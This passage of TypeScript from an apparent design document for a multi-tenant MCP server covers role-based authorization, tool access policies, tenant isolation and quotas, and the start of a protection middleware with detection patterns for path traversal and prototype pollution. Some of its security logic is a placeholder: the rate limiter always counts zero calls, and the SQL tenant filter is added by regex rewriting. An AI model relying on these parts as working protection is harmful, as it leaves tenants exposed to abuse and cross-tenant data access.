      reason: `Missing all permissions: ${requiredPermissions.join(', ')}`
    };
  }
  
  /**
   * Create custom role
   */
  async createRole(
    tenantId: string,
    role: Omit<Role, 'id' | 'tenantId' | 'isSystem'>
  ): Promise<Role> {
    const roleId = `role:${tenantId}:${role.name.toLowerCase().replace(/\s+/g, '_')}`;
    
    const newRole: Role = {
      ...role,
      id: roleId,
      tenantId,
      isSystem: false
    };
    
    // Validate inherited roles exist
    if (newRole.inherits) {
      for (const parentId of newRole.inherits) {
        const parent = await this.getRole(parentId);
        if (!parent) {
          throw new Error(`Parent role not found: ${parentId}`);
        }
        
        // Prevent circular inheritance
        if (await this.hasCircularInheritance(roleId, parentId)) {
          throw new Error(`Circular inheritance detected with: ${parentId}`);
        }
      }
    }
    
    // Store role
    await this.redis.set(`authz:role:${roleId}`, JSON.stringify(newRole));
    await this.redis.sadd(`authz:roles:${tenantId}`, roleId);
    
    // Invalidate cache
    this.roleCache.set(roleId, newRole);
    this.invalidatePermissionCache(tenantId);
    
    this.logger.info({ roleId, tenantId }, 'Role created');
    this.emit('role:created', newRole);
    
    return newRole;
  }
  
  /**
   * Update role permissions
   */
  async updateRolePermissions(
    roleId: string,
    tenantId: string,
    permissions: Permission[]
  ): Promise<Role | null> {
    const role = await this.getRole(roleId);
    
    if (!role) {
      return null;
    }
    
    // Cannot modify system roles
    if (role.isSystem) {
      throw new Error('Cannot modify system roles');
    }
    
    // Verify tenant ownership
    if (role.tenantId !== tenantId && role.tenantId !== '*') {
      throw new Error('Unauthorized role modification');
    }
    
    role.permissions = permissions;
    
    await this.redis.set(`authz:role:${roleId}`, JSON.stringify(role));
    
    // Invalidate cache
    this.roleCache.set(roleId, role);
    this.invalidatePermissionCache(tenantId);
    
    this.logger.info({ roleId, permissions }, 'Role permissions updated');
    this.emit('role:updated', role);
    
    return role;
  }
  
  /**
   * Assign role to principal
   */
  async assignRole(
    principalId: string,
    tenantId: string,
    roleId: string
  ): Promise<void> {
    const role = await this.getRole(roleId);
    
    if (!role) {
      throw new Error(`Role not found: ${roleId}`);
    }
    
    // Verify role is available for tenant
    if (role.tenantId !== '*' && role.tenantId !== tenantId) {
      throw new Error('Role not available for tenant');
    }
    
    await this.redis.sadd(`authz:principal:${tenantId}:${principalId}:roles`, roleId);
    
    // Invalidate principal's permission cache
    this.permissionCache.delete(`${tenantId}:${principalId}`);
    
    this.logger.info({ principalId, tenantId, roleId }, 'Role assigned');
    this.emit('role:assigned', { principalId, tenantId, roleId });
  }
  
  /**
   * Remove role from principal
   */
  async removeRole(
    principalId: string,
    tenantId: string,
    roleId: string
  ): Promise<void> {
    await this.redis.srem(`authz:principal:${tenantId}:${principalId}:roles`, roleId);
    
    // Invalidate cache
    this.permissionCache.delete(`${tenantId}:${principalId}`);
    
    this.logger.info({ principalId, tenantId, roleId }, 'Role removed');
    this.emit('role:removed', { principalId, tenantId, roleId });
  }
  
  /**
   * Get principal's roles
   */
  async getPrincipalRoles(principalId: string, tenantId: string): Promise<Role[]> {
    const roleIds = await this.redis.smembers(
      `authz:principal:${tenantId}:${principalId}:roles`
    );
    
    const roles: Role[] = [];
    for (const roleId of roleIds) {
      const role = await this.getRole(roleId);
      if (role) {
        roles.push(role);
      }
    }
    
    return roles;
  }
  
  /**
   * Get all tenant roles
   */
  async getTenantRoles(tenantId: string): Promise<Role[]> {
    const customRoleIds = await this.redis.smembers(`authz:roles:${tenantId}`);
    
    const roles: Role[] = [...this.systemRoles];
    
    for (const roleId of customRoleIds) {
      const role = await this.getRole(roleId);
      if (role) {
        roles.push(role);
      }
    }
    
    return roles;
  }
  
  // Private methods
  
  private async initializeSystemRoles(): Promise<void> {
    for (const role of this.systemRoles) {
      this.roleCache.set(role.id, role);
    }
  }
  
  private async getRole(roleId: string): Promise<Role | null> {
    // Check cache
    if (this.roleCache.has(roleId)) {
      return this.roleCache.get(roleId)!;
    }
    
    // Check system roles
    const systemRole = this.systemRoles.find(r => r.id === roleId);
    if (systemRole) {
      return systemRole;
    }
    
    // Load from Redis
    const data = await this.redis.get(`authz:role:${roleId}`);
    if (!data) {
      return null;
    }
    
    const role: Role = JSON.parse(data);
    this.roleCache.set(roleId, role);
    
    return role;
  }
  
  private async getEffectivePermissions(
    tenantId: string,
    roleIds: string[]
  ): Promise<Set<Permission>> {
    const cacheKey = `${tenantId}:${roleIds.sort().join(',')}`;
    
    // Check cache
    if (this.permissionCache.has(cacheKey)) {
      return this.permissionCache.get(cacheKey)!;
    }
    
    const permissions = new Set<Permission>();
    const processedRoles = new Set<string>();
    
    const processRole = async (roleId: string): Promise<void> => {
      if (processedRoles.has(roleId)) {
        return; // Prevent infinite loops
      }
      processedRoles.add(roleId);
      
      const role = await this.getRole(roleId);
      if (!role) {
        return;
      }
      
      // Add direct permissions
      for (const permission of role.permissions) {
        permissions.add(permission);
      }
      
      // Process inherited roles
      if (role.inherits) {
        for (const parentId of role.inherits) {
          await processRole(parentId);
        }
      }
    };
    
    // Process all assigned roles
    for (const roleId of roleIds) {
      await processRole(roleId);
    }
    
    // Cache result
    this.permissionCache.set(cacheKey, permissions);
    
    return permissions;
  }
  
  private checkWildcardPermission(
    permissions: Set<Permission>,
    required: Permission
  ): string | null {
    // Check exact match first
    if (permissions.has(required)) {
      return required;
    }
    
    // Parse required permission
    const parts = required.split(':');
    
    // Check progressively broader wildcards
    for (let i = parts.length - 1; i >= 0; i--) {
      const wildcardPermission = [...parts.slice(0, i), '*'].join(':') as Permission;
      if (permissions.has(wildcardPermission)) {
        return wildcardPermission;
      }
    }
    
    return null;
  }
  
  private async hasCircularInheritance(
    roleId: string,
    parentId: string,
    visited: Set<string> = new Set()
  ): Promise<boolean> {
    if (visited.has(parentId)) {
      return parentId === roleId;
    }
    
    visited.add(parentId);
    
    const parent = await this.getRole(parentId);
    if (!parent || !parent.inherits) {
      return false;
    }
    
    for (const grandparentId of parent.inherits) {
      if (grandparentId === roleId) {
        return true;
      }
      if (await this.hasCircularInheritance(roleId, grandparentId, visited)) {
        return true;
      }
    }
    
    return false;
  }
  
  private invalidatePermissionCache(tenantId: string): void {
    for (const key of this.permissionCache.keys()) {
      if (key.startsWith(`${tenantId}:`)) {
        this.permissionCache.delete(key);
      }
    }
  }
}
```

#### 8.3.2 Tool Authorization

```typescript
// src/mcp/security/tool-authorization.ts

import { Logger } from 'pino';
import { AuthorizationService, Permission, AuthorizationContext } from './authorization';
import { EventEmitter } from 'events';

/**
 * Tool Permission Level
 */
type ToolPermissionLevel = 'none' | 'read' | 'execute' | 'configure' | 'admin';

/**
 * Tool Access Policy
 */
interface ToolAccessPolicy {
  toolName: string;
  defaultLevel: ToolPermissionLevel;
  requiredRoles?: string[];
  requiredPermissions?: Permission[];
  allowedTenants?: string[]; // Empty = all tenants
  deniedTenants?: string[];
  rateLimit?: {
    maxCalls: number;
    windowSeconds: number;
  };
  auditLevel: 'none' | 'basic' | 'detailed';
  restrictions?: {
    requireApproval?: boolean;
    maxParameterLength?: number;
    allowedParameterPatterns?: Record<string, RegExp>;
    deniedParameterPatterns?: Record<string, RegExp>;
  };
}

/**
 * Tool Execution Context
 */
interface ToolExecutionContext {
  principal: AuthorizationContext;
  toolName: string;
  parameters: Record<string, any>;
  sessionId: string;
  conversationId: string;
}

/**
 * Tool Authorization Result
 */
interface ToolAuthorizationResult {
  authorized: boolean;
  level: ToolPermissionLevel;
  restrictions?: {
    requireApproval: boolean;
    parameterValidation: { valid: boolean; errors: string[] };
  };
  reason?: string;
  auditRequired: boolean;
}

/**
 * Tool Authorization Service
 * Controls access to MCP tools based on policies
 */
export class ToolAuthorizationService extends EventEmitter {
  private readonly authService: AuthorizationService;
  private readonly logger: Logger;
  
  // Tool policies
  private readonly policies: Map<string, ToolAccessPolicy> = new Map();
  
  // Default policies by category
  private readonly defaultPolicies: Record<string, Partial<ToolAccessPolicy>> = {
    'products': {
      defaultLevel: 'execute',
      auditLevel: 'basic'
    },
    'orders': {
      defaultLevel: 'execute',
      auditLevel: 'detailed',
      restrictions: { requireApproval: false }
    },
    'pricing': {
      defaultLevel: 'read',
      auditLevel: 'detailed',
      restrictions: { requireApproval: true }
    },
    'admin': {
      defaultLevel: 'none',
      requiredPermissions: ['mcp:admin'],
      auditLevel: 'detailed'
    },
    'external': {
      defaultLevel: 'execute',
      auditLevel: 'detailed',
      rateLimit: { maxCalls: 100, windowSeconds: 60 }
    }
  };
  
  constructor(authService: AuthorizationService, logger: Logger) {
    super();
    this.authService = authService;
    this.logger = logger;
    
    this.initializeDefaultPolicies();
  }
  
  /**
   * Register tool access policy
   */
  registerPolicy(policy: ToolAccessPolicy): void {
    this.policies.set(policy.toolName, policy);
    this.logger.debug({ toolName: policy.toolName }, 'Tool policy registered');
  }
  
  /**
   * Check tool authorization
   */
  async authorizeToolExecution(
    context: ToolExecutionContext
  ): Promise<ToolAuthorizationResult> {
    const policy = this.getPolicy(context.toolName);
    
    // Check tenant restrictions
    if (!this.checkTenantAccess(policy, context.principal.tenantId)) {
      return {
        authorized: false,
        level: 'none',
        reason: 'Tool not available for tenant',
        auditRequired: true
      };
    }
    
    // Check required roles
    if (policy.requiredRoles && policy.requiredRoles.length > 0) {
      const hasRequiredRole = policy.requiredRoles.some(
        role => context.principal.roles.includes(role)
      );
      if (!hasRequiredRole) {
        return {
          authorized: false,
          level: 'none',
          reason: 'Missing required role',
          auditRequired: true
        };
      }
    }
    
    // Check required permissions
    if (policy.requiredPermissions && policy.requiredPermissions.length > 0) {
      const { allowed, missingPermissions } = await this.authService.checkPermissions(
        context.principal,
        policy.requiredPermissions
      );
      
      if (!allowed) {
        return {
          authorized: false,
          level: 'none',
          reason: `Missing permissions: ${missingPermissions.join(', ')}`,
          auditRequired: true
        };
      }
    }
    
    // Check tool-specific permission
    const toolPermission = `tool:${context.toolName}:execute` as Permission;
    const permissionResult = await this.authService.checkPermission(
      context.principal,
      toolPermission
    );
    
    // Determine access level
    let level: ToolPermissionLevel = 'none';
    
    if (permissionResult.allowed) {
      level = 'execute';
      
      // Check for higher levels
      const configureResult = await this.authService.checkPermission(
        context.principal,
        `tool:${context.toolName}:configure` as Permission
      );
      if (configureResult.allowed) {
        level = 'configure';
      }
      
      const adminResult = await this.authService.checkPermission(
        context.principal,
        'tool:*' as Permission
      );
      if (adminResult.allowed) {
        level = 'admin';
      }
    } else {
      // Check default level
      level = policy.defaultLevel;
    }
    
    if (level === 'none') {
      return {
        authorized: false,
        level: 'none',
        reason: 'No tool access permission',
        auditRequired: policy.auditLevel !== 'none'
      };
    }
    
    // Validate parameters
    const paramValidation = this.validateParameters(policy, context.parameters);
    
    // Check if approval required
    const requireApproval = policy.restrictions?.requireApproval && 
                           level !== 'admin' &&
                           level !== 'configure';
    
    const result: ToolAuthorizationResult = {
      authorized: true,
      level,
      restrictions: {
        requireApproval: requireApproval || false,
        parameterValidation: paramValidation
      },
      auditRequired: policy.auditLevel !== 'none'
    };
    
    // Block if parameter validation failed
    if (!paramValidation.valid) {
      result.authorized = false;
      result.reason = `Parameter validation failed: ${paramValidation.errors.join(', ')}`;
    }
    
    // Emit audit event
    if (result.auditRequired) {
      this.emit('tool:authorization', {
        ...context,
        result,
        timestamp: new Date()
      });
    }
    
    return result;
  }
  
  /**
   * Check rate limit for tool
   */
  async checkRateLimit(
    toolName: string,
    principalId: string,
    tenantId: string
  ): Promise<{ allowed: boolean; remaining: number; resetAt: Date }> {
    const policy = this.getPolicy(toolName);
    
    if (!policy.rateLimit) {
      return { allowed: true, remaining: -1, resetAt: new Date() };
    }
    
    const key = `ratelimit:tool:${toolName}:${tenantId}:${principalId}`;
    const now = Date.now();
    const windowStart = now - (policy.rateLimit.windowSeconds * 1000);
    
    // This would use Redis sorted sets in production
    // Simplified implementation here
    const count = 0; // Would be actual count from Redis
    const remaining = policy.rateLimit.maxCalls - count;
    
    return {
      allowed: remaining > 0,
      remaining: Math.max(0, remaining),
      resetAt: new Date(now + policy.rateLimit.windowSeconds * 1000)
    };
  }
  
  /**
   * Get tools available to principal
   */
  async getAvailableTools(
    context: AuthorizationContext
  ): Promise<Array<{ name: string; level: ToolPermissionLevel }>> {
    const available: Array<{ name: string; level: ToolPermissionLevel }> = [];
    
    for (const [toolName, policy] of this.policies) {
      // Check tenant access
      if (!this.checkTenantAccess(policy, context.tenantId)) {
        continue;
      }
      
      // Check permission
      const toolPermission = `tool:${toolName}:execute` as Permission;
      const result = await this.authService.checkPermission(context, toolPermission);
      
      if (result.allowed || policy.defaultLevel !== 'none') {
        available.push({
          name: toolName,
          level: result.allowed ? 'execute' : policy.defaultLevel
        });
      }
    }
    
    return available;
  }
  
  // Private methods
  
  private initializeDefaultPolicies(): void {
    // Product tools
    ['search_products', 'get_product', 'list_categories'].forEach(tool => {
      this.registerPolicy({
        toolName: tool,
        ...this.defaultPolicies['products'],
        defaultLevel: 'execute',
        auditLevel: 'basic'
      });
    });
    
    // Order tools
    ['create_order', 'update_order', 'get_order'].forEach(tool => {
      this.registerPolicy({
        toolName: tool,
        ...this.defaultPolicies['orders'],
        defaultLevel: 'execute',
        auditLevel: 'detailed'
      });
    });
    
    // Pricing tools
    ['calculate_price', 'apply_discount', 'get_pricing_rules'].forEach(tool => {
      this.registerPolicy({
        toolName: tool,
        ...this.defaultPolicies['pricing'],
        defaultLevel: 'execute',
        auditLevel: 'detailed'
      });
    });
    
    // Admin tools
    ['manage_users', 'configure_system', 'view_audit_logs'].forEach(tool => {
      this.registerPolicy({
        toolName: tool,
        ...this.defaultPolicies['admin'],
        defaultLevel: 'none',
        requiredPermissions: ['mcp:admin'],
        auditLevel: 'detailed'
      });
    });
  }
  
  private getPolicy(toolName: string): ToolAccessPolicy {
    return this.policies.get(toolName) || {
      toolName,
      defaultLevel: 'none',
      auditLevel: 'basic'
    };
  }
  
  private checkTenantAccess(policy: ToolAccessPolicy, tenantId: string): boolean {
    // Check denied list
    if (policy.deniedTenants?.includes(tenantId)) {
      return false;
    }
    
    // Check allowed list (empty = all allowed)
    if (policy.allowedTenants && policy.allowedTenants.length > 0) {
      return policy.allowedTenants.includes(tenantId);
    }
    
    return true;
  }
  
  private validateParameters(
    policy: ToolAccessPolicy,
    parameters: Record<string, any>
  ): { valid: boolean; errors: string[] } {
    const errors: string[] = [];
    
    if (!policy.restrictions) {
      return { valid: true, errors: [] };
    }
    
    // Check parameter length
    if (policy.restrictions.maxParameterLength) {
      for (const [key, value] of Object.entries(parameters)) {
        const strValue = typeof value === 'string' ? value : JSON.stringify(value);
        if (strValue.length > policy.restrictions.maxParameterLength) {
          errors.push(`Parameter '${key}' exceeds maximum length`);
        }
      }
    }
    
    // Check allowed patterns
    if (policy.restrictions.allowedParameterPatterns) {
      for (const [key, pattern] of Object.entries(policy.restrictions.allowedParameterPatterns)) {
        if (parameters[key] && !pattern.test(String(parameters[key]))) {
          errors.push(`Parameter '${key}' does not match required pattern`);
        }
      }
    }
    
    // Check denied patterns
    if (policy.restrictions.deniedParameterPatterns) {
      for (const [key, pattern] of Object.entries(policy.restrictions.deniedParameterPatterns)) {
        if (parameters[key] && pattern.test(String(parameters[key]))) {
          errors.push(`Parameter '${key}' contains disallowed pattern`);
        }
      }
    }
    
    return { valid: errors.length === 0, errors };
  }
}
```

### 8.4 Tenant Isolation

Tenant isolation ensures complete separation of data and operations between different organizations using the MCP server.

#### 8.4.1 Tenant Context Management

```typescript
// src/workers/L/security/tenant-isolation.ts
import { Redis } from 'ioredis';
import { Logger } from '../../../shared/logger';
import { EventEmitter } from 'events';

/**
 * Tenant configuration and limits
 */
interface TenantConfig {
  tenantId: string;
  name: string;
  tier: 'free' | 'starter' | 'professional' | 'enterprise';
  status: 'active' | 'suspended' | 'trial' | 'cancelled';
  createdAt: Date;
  settings: {
    maxSessions: number;
    maxConcurrentRequests: number;
    maxTokensPerDay: number;
    maxStorageBytes: number;
    allowedModels: string[];
    allowedTools: string[];
    customPrompts: boolean;
    dataRetentionDays: number;
    encryptionLevel: 'standard' | 'enhanced';
  };
  quotas: {
    tokensUsedToday: number;
    requestsToday: number;
    storageUsed: number;
    sessionsActive: number;
  };
  metadata: {
    industry?: string;
    region?: string;
    timezone?: string;
    customFields?: Record<string, any>;
  };
}

/**
 * Tenant context for request processing
 */
interface TenantContext {
  tenantId: string;
  config: TenantConfig;
  permissions: Set<string>;
  quotaRemaining: {
    tokens: number;
    requests: number;
    storage: number;
  };
  isolationLevel: 'logical' | 'physical';
}

/**
 * Tenant isolation violations
 */
interface IsolationViolation {
  type: 'cross_tenant_access' | 'quota_exceeded' | 'unauthorized_resource' | 
        'suspended_tenant' | 'invalid_context';
  tenantId: string;
  attemptedResource?: string;
  attemptedAction?: string;
  timestamp: Date;
  details: string;
}

/**
 * Tier-based limits configuration
 */
const TIER_LIMITS: Record<string, Partial<TenantConfig['settings']>> = {
  free: {
    maxSessions: 5,
    maxConcurrentRequests: 2,
    maxTokensPerDay: 10000,
    maxStorageBytes: 10 * 1024 * 1024, // 10MB
    allowedModels: ['claude-3-haiku'],
    customPrompts: false,
    dataRetentionDays: 7,
    encryptionLevel: 'standard'
  },
  starter: {
    maxSessions: 25,
    maxConcurrentRequests: 5,
    maxTokensPerDay: 100000,
    maxStorageBytes: 100 * 1024 * 1024, // 100MB
    allowedModels: ['claude-3-haiku', 'claude-3-sonnet'],
    customPrompts: false,
    dataRetentionDays: 30,
    encryptionLevel: 'standard'
  },
  professional: {
    maxSessions: 100,
    maxConcurrentRequests: 20,
    maxTokensPerDay: 1000000,
    maxStorageBytes: 1024 * 1024 * 1024, // 1GB
    allowedModels: ['claude-3-haiku', 'claude-3-sonnet', 'claude-3-opus'],
    customPrompts: true,
    dataRetentionDays: 90,
    encryptionLevel: 'enhanced'
  },
  enterprise: {
    maxSessions: -1, // unlimited
    maxConcurrentRequests: 100,
    maxTokensPerDay: -1, // unlimited
    maxStorageBytes: 10 * 1024 * 1024 * 1024, // 10GB
    allowedModels: ['claude-3-haiku', 'claude-3-sonnet', 'claude-3-opus', 'claude-3-5-sonnet'],
    customPrompts: true,
    dataRetentionDays: 365,
    encryptionLevel: 'enhanced'
  }
};

/**
 * Tenant Isolation Manager
 * Ensures complete data and operation separation between tenants
 */
export class TenantIsolationManager extends EventEmitter {
  private redis: Redis;
  private logger: Logger;
  private tenantCache: Map<string, { config: TenantConfig; expiresAt: number }>;
  private contextStack: Map<string, TenantContext[]>; // Per-request context stack
  private violationLog: IsolationViolation[];
  
  constructor(redis: Redis, logger: Logger) {
    super();
    this.redis = redis;
    this.logger = logger;
    this.tenantCache = new Map();
    this.contextStack = new Map();
    this.violationLog = [];
    
    this.startQuotaResetScheduler();
  }
  
  /**
   * Load tenant configuration
   */
  async loadTenantConfig(tenantId: string): Promise<TenantConfig> {
    // Check cache first
    const cached = this.tenantCache.get(tenantId);
    if (cached && cached.expiresAt > Date.now()) {
      return cached.config;
    }
    
    // Load from Redis
    const configKey = `tenant:${tenantId}:config`;
    const configData = await this.redis.get(configKey);
    
    if (!configData) {
      throw new Error(`Tenant not found: ${tenantId}`);
    }
    
    const config: TenantConfig = JSON.parse(configData);
    
    // Load current quotas
    config.quotas = await this.loadQuotas(tenantId);
    
    // Cache for 5 minutes
    this.tenantCache.set(tenantId, {
      config,
      expiresAt: Date.now() + 5 * 60 * 1000
    });
    
    return config;
  }
  
  /**
   * Create tenant context for request processing
   */
  async createContext(
    tenantId: string,
    requestId: string
  ): Promise<TenantContext> {
    const config = await this.loadTenantConfig(tenantId);
    
    // Check tenant status
    if (config.status === 'suspended') {
      this.recordViolation({
        type: 'suspended_tenant',
        tenantId,
        timestamp: new Date(),
        details: 'Attempted access by suspended tenant'
      });
      throw new Error('Tenant account is suspended');
    }
    
    if (config.status === 'cancelled') {
      throw new Error('Tenant account is cancelled');
    }
    
    // Load permissions
    const permissions = await this.loadTenantPermissions(tenantId);
    
    // Calculate remaining quotas
    const quotaRemaining = {
      tokens: config.settings.maxTokensPerDay === -1 
        ? Infinity 
        : config.settings.maxTokensPerDay - config.quotas.tokensUsedToday,
      requests: 1000000 - config.quotas.requestsToday, // Default request limit
      storage: config.settings.maxStorageBytes - config.quotas.storageUsed
    };
    
    const context: TenantContext = {
      tenantId,
      config,
      permissions,
      quotaRemaining,
      isolationLevel: config.tier === 'enterprise' ? 'physical' : 'logical'
    };
    
    // Push to context stack
    if (!this.contextStack.has(requestId)) {
      this.contextStack.set(requestId, []);
    }
    this.contextStack.get(requestId)!.push(context);
    
    this.emit('context:created', { tenantId, requestId });
    
    return context;
  }
  
  /**
   * Get current tenant context
   */
  getCurrentContext(requestId: string): TenantContext | null {
    const stack = this.contextStack.get(requestId);
    if (!stack || stack.length === 0) {
      return null;
    }
    return stack[stack.length - 1];
  }
  
  /**
   * Release tenant context
   */
  releaseContext(requestId: string): void {
    const stack = this.contextStack.get(requestId);
    if (stack && stack.length > 0) {
      const context = stack.pop();
      if (stack.length === 0) {
        this.contextStack.delete(requestId);
      }
      this.emit('context:released', { 
        tenantId: context?.tenantId, 
        requestId 
      });
    }
  }
  
  /**
   * Validate tenant isolation for resource access
   */
  async validateAccess(
    requestId: string,
    resourceType: string,
    resourceId: string,
    action: 'read' | 'write' | 'delete' | 'execute'
  ): Promise<{ allowed: boolean; reason?: string }> {
    const context = this.getCurrentContext(requestId);
    
    if (!context) {
      this.recordViolation({
        type: 'invalid_context',
        tenantId: 'unknown',
        attemptedResource: `${resourceType}:${resourceId}`,
        attemptedAction: action,
        timestamp: new Date(),
        details: 'No tenant context for request'
      });
      return { allowed: false, reason: 'No tenant context' };
    }
    
    // Check resource ownership
    const resourceTenantId = await this.getResourceTenant(resourceType, resourceId);
    
    if (resourceTenantId && resourceTenantId !== context.tenantId) {
      this.recordViolation({
        type: 'cross_tenant_access',
        tenantId: context.tenantId,
        attemptedResource: `${resourceType}:${resourceId}`,
        attemptedAction: action,
        timestamp: new Date(),
        details: `Attempted access to resource owned by tenant ${resourceTenantId}`
      });
      
      this.emit('violation:cross_tenant', {
        tenantId: context.tenantId,
        resourceType,
        resourceId,
        action
      });
      
      return { 
        allowed: false, 
        reason: 'Cross-tenant access denied' 
      };
    }
    
    // Check permission
    const requiredPermission = `${resourceType}:${action}`;
    if (!context.permissions.has(requiredPermission) && 
        !context.permissions.has(`${resourceType}:*`) &&
        !context.permissions.has('*:*')) {
      this.recordViolation({
        type: 'unauthorized_resource',
        tenantId: context.tenantId,
        attemptedResource: `${resourceType}:${resourceId}`,
        attemptedAction: action,
        timestamp: new Date(),
        details: `Missing permission: ${requiredPermission}`
      });
      
      return { 
        allowed: false, 
        reason: `Permission denied: ${requiredPermission}` 
      };
    }
    
    return { allowed: true };
  }
  
  /**
   * Check and consume quota
   */
  async consumeQuota(
    requestId: string,
    quotaType: 'tokens' | 'requests' | 'storage',
    amount: number
  ): Promise<{ allowed: boolean; remaining: number }> {
    const context = this.getCurrentContext(requestId);
    
    if (!context) {
      return { allowed: false, remaining: 0 };
    }
    
    // Check if unlimited
    if (context.quotaRemaining[quotaType] === Infinity) {
      return { allowed: true, remaining: Infinity };
    }
    
    // Check available quota
    if (context.quotaRemaining[quotaType] < amount) {
      this.recordViolation({
        type: 'quota_exceeded',
        tenantId: context.tenantId,
        timestamp: new Date(),
        details: `${quotaType} quota exceeded: requested ${amount}, available ${context.quotaRemaining[quotaType]}`
      });
      
      this.emit('violation:quota_exceeded', {
        tenantId: context.tenantId,
        quotaType,
        requested: amount,
        available: context.quotaRemaining[quotaType]
      });
      
      return { 
        allowed: false, 
        remaining: context.quotaRemaining[quotaType] 
      };
    }
    
    // Consume quota
    context.quotaRemaining[quotaType] -= amount;
    
    // Update Redis
    await this.updateQuota(context.tenantId, quotaType, amount);
    
    return { 
      allowed: true, 
      remaining: context.quotaRemaining[quotaType] 
    };
  }
  
  /**
   * Get tenant-specific database schema/namespace
   */
  getTenantNamespace(tenantId: string): string {
    // For logical isolation, use tenant prefix
    return `tenant_${tenantId}`;
  }
  
  /**
   * Get tenant-specific Redis key prefix
   */
  getTenantKeyPrefix(tenantId: string): string {
    return `t:${tenantId}:`;
  }
  
  /**
   * Wrap database query with tenant isolation
   */
  wrapQuery<T>(
    requestId: string,
    query: string,
    params: any[]
  ): { query: string; params: any[] } {
    const context = this.getCurrentContext(requestId);
    
    if (!context) {
      throw new Error('No tenant context for query');
    }
    
    // Add tenant_id to WHERE clause if not present
    if (!query.toLowerCase().includes('tenant_id')) {
      // Simple injection - in production, use proper query builder
      if (query.toLowerCase().includes('where')) {
        query = query.replace(/where/i, `WHERE tenant_id = $${params.length + 1} AND`);
      } else if (query.toLowerCase().includes('from')) {
        query = query.replace(
          /from\s+(\w+)/i, 
          `FROM $1 WHERE tenant_id = $${params.length + 1}`
        );
      }
      params.push(context.tenantId);
    }
    
    return { query, params };
  }
  
  /**
   * Validate data belongs to tenant before modification
   */
  async validateDataOwnership(
    requestId: string,
    tableName: string,
    recordIds: string[]
  ): Promise<{ valid: boolean; invalidIds: string[] }> {
    const context = this.getCurrentContext(requestId);
    
    if (!context) {
      return { valid: false, invalidIds: recordIds };
    }
    
    // Check ownership via Redis cache or database
    const invalidIds: string[] = [];
    
    for (const recordId of recordIds) {
      const cacheKey = `${this.getTenantKeyPrefix(context.tenantId)}ownership:${tableName}:${recordId}`;
      const owner = await this.redis.get(cacheKey);
      
      if (owner && owner !== context.tenantId) {
        invalidIds.push(recordId);
      }
    }
    
    if (invalidIds.length > 0) {
      this.recordViolation({
        type: 'cross_tenant_access',
        tenantId: context.tenantId,
        attemptedResource: `${tableName}:${invalidIds.join(',')}`,
        attemptedAction: 'modify',
        timestamp: new Date(),
        details: `Attempted modification of records belonging to other tenant`
      });
    }
    
    return {
      valid: invalidIds.length === 0,
      invalidIds
    };
  }
  
  // Helper methods
  
  private async loadQuotas(tenantId: string): Promise<TenantConfig['quotas']> {
    const quotaKey = `tenant:${tenantId}:quotas`;
    const quotaData = await this.redis.hgetall(quotaKey);
    
    return {
      tokensUsedToday: parseInt(quotaData.tokensUsedToday || '0'),
      requestsToday: parseInt(quotaData.requestsToday || '0'),
      storageUsed: parseInt(quotaData.storageUsed || '0'),
      sessionsActive: parseInt(quotaData.sessionsActive || '0')
    };
  }
  
  private async loadTenantPermissions(tenantId: string): Promise<Set<string>> {
    const permKey = `tenant:${tenantId}:permissions`;
    const permissions = await this.redis.smembers(permKey);
    return new Set(permissions);
  }
  
  private async getResourceTenant(
    resourceType: string, 
    resourceId: string
  ): Promise<string | null> {
    const key = `resource:${resourceType}:${resourceId}:tenant`;
    return this.redis.get(key);
  }
  
  private async updateQuota(
    tenantId: string,
    quotaType: string,
    amount: number
  ): Promise<void> {
    const quotaKey = `tenant:${tenantId}:quotas`;
    const field = quotaType === 'tokens' ? 'tokensUsedToday' :
                  quotaType === 'requests' ? 'requestsToday' : 'storageUsed';
    
    await this.redis.hincrby(quotaKey, field, amount);
  }
  
  private recordViolation(violation: IsolationViolation): void {
    this.violationLog.push(violation);
    
    // Keep last 1000 violations
    if (this.violationLog.length > 1000) {
      this.violationLog.shift();
    }
    
    this.logger.warn('Isolation violation', violation);
    this.emit('violation', violation);
  }
  
  private startQuotaResetScheduler(): void {
    // Reset daily quotas at midnight
    const now = new Date();
    const tomorrow = new Date(now);
    tomorrow.setDate(tomorrow.getDate() + 1);
    tomorrow.setHours(0, 0, 0, 0);
    
    const msUntilMidnight = tomorrow.getTime() - now.getTime();
    
    setTimeout(() => {
      this.resetDailyQuotas();
      // Then run every 24 hours
      setInterval(() => this.resetDailyQuotas(), 24 * 60 * 60 * 1000);
    }, msUntilMidnight);
  }
  
  private async resetDailyQuotas(): Promise<void> {
    const pattern = 'tenant:*:quotas';
    const keys = await this.redis.keys(pattern);
    
    for (const key of keys) {
      await this.redis.hmset(key, {
        tokensUsedToday: '0',
        requestsToday: '0'
      });
    }
    
    // Clear cache
    this.tenantCache.clear();
    
    this.logger.info('Daily quotas reset', { tenantsReset: keys.length });
    this.emit('quotas:reset', { count: keys.length });
  }
  
  /**
   * Get violation statistics
   */
  getViolationStats(): {
    total: number;
    byType: Record<string, number>;
    byTenant: Record<string, number>;
    recent: IsolationViolation[];
  } {
    const byType: Record<string, number> = {};
    const byTenant: Record<string, number> = {};
    
    for (const v of this.violationLog) {
      byType[v.type] = (byType[v.type] || 0) + 1;
      byTenant[v.tenantId] = (byTenant[v.tenantId] || 0) + 1;
    }
    
    return {
      total: this.violationLog.length,
      byType,
      byTenant,
      recent: this.violationLog.slice(-10)
    };
  }
}
```

#### 8.4.2 Cross-Tenant Protection Middleware

```typescript
// src/workers/L/security/tenant-middleware.ts
import { TenantIsolationManager } from './tenant-isolation';
import { Logger } from '../../../shared/logger';

/**
 * Request with tenant context
 */
interface TenantRequest {
  requestId: string;
  tenantId: string;
  userId: string;
  method: string;
  path: string;
  body?: any;
  query?: Record<string, string>;
}

/**
 * Middleware response
 */
interface MiddlewareResult {
  allowed: boolean;
  reason?: string;
  sanitizedBody?: any;
}

/**
 * Cross-Tenant Protection Middleware
 * Intercepts requests to ensure tenant isolation
 */
export class TenantProtectionMiddleware {
  private isolation: TenantIsolationManager;
  private logger: Logger;
  
  // Patterns that might indicate cross-tenant access attempts
  private suspiciousPatterns = [
    /tenant[_-]?id\s*[=:]\s*['"]?[a-z0-9-]+['"]?/gi,
    /org[_-]?id\s*[=:]\s*['"]?[a-z0-9-]+['"]?/gi,
    /\.\.\//g, // Path traversal
    /__proto__/gi, // Prototype pollution
    /constructor\s*\[/gi
  ];
  
  constructor(isolation: TenantIsolationManager, logger: Logger) {
    this.isolation = isolation;
    this.logger = logger;
  }
  
  /**
   * Process incoming request
   */
  async process(request: TenantRequest): Promise<MiddlewareResult> {
    // Create tenant context
    try {
